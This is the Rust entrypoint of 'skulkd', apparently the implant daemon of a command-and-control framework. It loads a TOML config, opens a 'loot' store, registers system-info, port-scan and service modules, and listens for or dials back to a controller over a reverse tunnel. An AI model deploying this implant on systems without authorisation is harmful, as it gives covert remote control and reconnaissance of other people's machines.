//! `skulkd` — the Skulk implant daemon. Wires the engine, its modules and the
//! socket transport into a single runnable process, driven by a TOML config.
//!
//! Usage:
//!   skulkd                 # load ./skulk.toml (defaults if absent)
//!   skulkd path/to.toml    # load a specific config

mod caps;
mod config;

use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use contract::ImplantInfo;
use engine::{Engine, RedbLoot};
#[cfg(feature = "mod-sysinfo")]
use example_sysinfo::SysInfo;
#[cfg(feature = "mod-portscan")]
use net_portscan::PortScan;
#[cfg(feature = "mod-services")]
use net_services::Services;
use transport::{run_dialer, run_listener, TransportConfig};

use config::{Config, Mode};

#[tokio::main]
async fn main() {
    let config_path = std::env::args().nth(1).unwrap_or_else(|| "skulk.toml".to_string());
    let config = match Config::load(&PathBuf::from(&config_path)) {
        Ok(config) => config,
        Err(e) => {
            eprintln!("skulkd: {e}");
            std::process::exit(1);
        }
    };

    init_tracing(&config.log);

    // Loot path comes from config, but SKULK_LOOT overrides it for deployment/tests.
    let loot_path = std::env::var("SKULK_LOOT").unwrap_or_else(|_| config.loot.path.clone());

    let hardware = if config.implant.hardware.is_empty() {
        format!("{}/{}", std::env::consts::OS, std::env::consts::ARCH)
    } else {
        config.implant.hardware.clone()
    };
    let implant = ImplantInfo {
        id: config.implant.id.clone(),
        hardware,
        firmware: env!("CARGO_PKG_VERSION").to_string(),
    };

    let capabilities = caps::detect();
    tracing::info!(?capabilities, "detected capabilities");

    let loot = match RedbLoot::open(&loot_path) {
        Ok(store) => Arc::new(store),
        Err(e) => {
            tracing::error!(path = %loot_path, "cannot open loot store: {e}");
            std::process::exit(1);
        }
    };

    let mut engine = Engine::new(implant, capabilities, loot);
    #[cfg(feature = "mod-sysinfo")]
    engine.register(Arc::new(SysInfo));
    #[cfg(feature = "mod-portscan")]
    engine.register(Arc::new(PortScan));
    #[cfg(feature = "mod-services")]
    engine.register(Arc::new(Services));
    let engine = Arc::new(engine);

    if config.heartbeat_secs > 0 {
        engine.spawn_heartbeat(Duration::from_secs(config.heartbeat_secs));
    }

    let modules = engine.module_ids();
    tracing::info!(
        id = %config.implant.id,
        loot = %loot_path,
        heartbeat_secs = config.heartbeat_secs,
        ?modules,
        "implant ready"
    );

    let transport = TransportConfig::default();
    let addr = config.transport.addr.clone();
    let mode = config.transport.mode;
    let shutdown = engine.clone();

    // Serve until the transport ends (error) or a Shutdown command is received.
    tokio::select! {
        result = async {
            match mode {
                Mode::Dial => {
                    tracing::info!(%addr, "reverse tunnel: dialing controller");
                    run_dialer(engine, addr.clone(), transport).await;
                    Ok::<(), std::io::Error>(())
                }
                Mode::Listen => {
                    tracing::info!(%addr, "listening for controller");
                    run_listener(engine, &addr, transport).await
                }
            }
        } => {
            if let Err(e) = result {
                tracing::error!("transport error: {e}");
                std::process::exit(1);
            }
        }
        _ = shutdown.wait_for_shutdown() => {
            tracing::info!("shutdown requested by controller; stopping");
        }
    }
}

/// Initialise structured logging to stderr. `RUST_LOG` overrides the config filter.
fn init_tracing(filter: &str) {
    use tracing_subscriber::{fmt, EnvFilter};

    let env = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(filter));
    fmt()
        .with_env_filter(env)
        .with_target(true)
        .with_writer(std::io::stderr)
        .init();
}
